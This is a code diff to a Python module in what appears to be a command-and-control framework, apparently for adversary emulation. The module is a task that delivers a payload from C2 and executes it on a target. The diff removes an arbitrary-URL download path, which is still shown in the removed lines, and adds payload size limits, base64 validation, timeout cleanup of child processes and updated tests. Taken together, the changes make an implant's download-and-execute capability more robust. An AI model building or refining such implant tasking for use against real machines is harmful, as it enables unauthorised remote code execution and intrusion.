@@ -40,6 +40,51 @@ from forge_c2.tasks.base_task import (
 
 log = logging.getLogger("forge.c2.tasks.download_exec")
 
+MAX_PAYLOAD_BYTES = 8 * 1024 * 1024
+URL_DOWNLOAD_DISABLED = (
+    "URL payload retrieval is disabled: outbound_policy_unsupported; "
+    "provide bounded inline data from the authenticated C2 channel"
+)
+
+
+async def _kill_and_reap(
+    process: asyncio.subprocess.Process,
+    communication: asyncio.Task[tuple[bytes, bytes]],
+) -> None:
+    """Stop a child and drain its pipes before deleting its staged artifact."""
+
+    if process.returncode is None:
+        try:
+            process.kill()
+        except ProcessLookupError:
+            pass
+        await process.wait()
+    await asyncio.gather(communication, return_exceptions=True)
+
+
+async def _communicate_and_reap(
+    process: asyncio.subprocess.Process,
+    *,
+    timeout: float,
+) -> tuple[bytes, bytes]:
+    """Communicate with a child and reap it on timeout, cancellation, or error."""
+
+    communication = asyncio.create_task(process.communicate())
+    try:
+        done, _pending = await asyncio.wait({communication}, timeout=timeout)
+        if communication not in done:
+            raise asyncio.TimeoutError
+        return communication.result()
+    except BaseException:
+        cleanup = asyncio.create_task(_kill_and_reap(process, communication))
+        while not cleanup.done():
+            try:
+                await asyncio.shield(cleanup)
+            except asyncio.CancelledError:
+                continue
+        cleanup.result()
+        raise
+
 
 # ══════════════════════════════════════════════════════════════════════
 #  EXECUTION MODES
@@ -178,9 +223,7 @@ class DownloadExecEngine:
                 **creation_flags,
             )
 
-            stdout, stderr = await asyncio.wait_for(
-                proc.communicate(), timeout=timeout,
-            )
+            stdout, stderr = await _communicate_and_reap(proc, timeout=timeout)
 
             output = stdout.decode(errors="replace")
             if stderr:
@@ -312,8 +355,8 @@ class DownloadExecTask(BaseTask):
     """Download file from C2 and execute on target.
 
     Args (via kwargs):
-        data:          Base64-encoded payload data (required unless url given)
-        url:           URL to download payload from (alternative to data)
+        data:          Base64-encoded payload data from the authenticated C2 channel
+        url:           Legacy field; rejected until a canonical outbound policy is bound
         filename:      Filename for the payload on disk
         dest_dir:      Destination directory (default: temp)
         arguments:     List of arguments for the payload
@@ -346,7 +389,9 @@ class DownloadExecTask(BaseTask):
         # ── Load payload ───────────────────────────────────────────
         if payload_b64:
             try:
-                payload_data = base64.b64decode(payload_b64)
+                if not isinstance(payload_b64, str):
+                    raise ValueError("payload data must be a base64 string")
+                payload_data = base64.b64decode(payload_b64, validate=True)
             except Exception as exc:
                 return TaskResult(
                     task_id=self.task_id, status=TaskStatus.FAILED,
@@ -354,17 +399,14 @@ class DownloadExecTask(BaseTask):
                     started_at=start, completed_at=time.time(),
                 )
         elif url:
-            # Download from URL
-            try:
-                import urllib.request
-                with urllib.request.urlopen(url, timeout=30) as resp:
-                    payload_data = resp.read()
-            except Exception as exc:
-                return TaskResult(
-                    task_id=self.task_id, status=TaskStatus.FAILED,
-                    error=f"Download failed from {url}: {exc}",
-                    started_at=start, completed_at=time.time(),
-                )
+            return TaskResult(
+                task_id=self.task_id,
+                status=TaskStatus.FAILED,
+                error=URL_DOWNLOAD_DISABLED,
+                started_at=start,
+                completed_at=time.time(),
+                metadata={"reason_code": "outbound_policy_unsupported"},
+            )
         else:
             return TaskResult(
                 task_id=self.task_id, status=TaskStatus.FAILED,
@@ -377,6 +419,15 @@ class DownloadExecTask(BaseTask):
                 task_id=self.task_id, status=TaskStatus.FAILED,
                 error="Payload data is empty.",
                 started_at=start, completed_at=time.time(),
+            )
+        if len(payload_data) > MAX_PAYLOAD_BYTES:
+            return TaskResult(
+                task_id=self.task_id,
+                status=TaskStatus.FAILED,
+                error=f"Payload exceeds the {MAX_PAYLOAD_BYTES}-byte task limit.",
+                started_at=start,
+                completed_at=time.time(),
+                metadata={"reason_code": "payload_size_limit"},
             )
 
         # ── Execute ────────────────────────────────────────────────
@@ -444,14 +495,14 @@ class TestDownloadExecTask:
     def test_no_payload(self) -> None:
         import asyncio
         task = DownloadExecTask(task_id="de3")
-        result = asyncio.get_event_loop().run_until_complete(task.execute())
+        result = asyncio.run(task.execute())
         assert result.status == TaskStatus.FAILED
         assert "No payload" in result.error
 
     def test_invalid_base64(self) -> None:
         import asyncio
         task = DownloadExecTask(task_id="de4", data="not-valid-base64!!!")
-        result = asyncio.get_event_loop().run_until_complete(task.execute())
+        result = asyncio.run(task.execute())
         assert result.status == TaskStatus.FAILED
 
     def test_hash_verification(self) -> None:
@@ -461,7 +512,7 @@ class TestDownloadExecTask:
         task = DownloadExecTask(
             task_id="de5", data=payload, expected_hash=wrong_hash,
         )
-        result = asyncio.get_event_loop().run_until_complete(task.execute())
+        result = asyncio.run(task.execute())
         assert result.status == TaskStatus.FAILED
         assert "mismatch" in result.error.lower() or result.status == TaskStatus.FAILED
 
@@ -478,6 +529,6 @@ class TestDownloadExecTask:
         task = DownloadExecTask(
             task_id="de6", data=payload, mode="memory",
         )
-        result = asyncio.get_event_loop().run_until_complete(task.execute())
+        result = asyncio.run(task.execute())
         assert result.status == TaskStatus.COMPLETED
         assert "EMULATION" in result.output
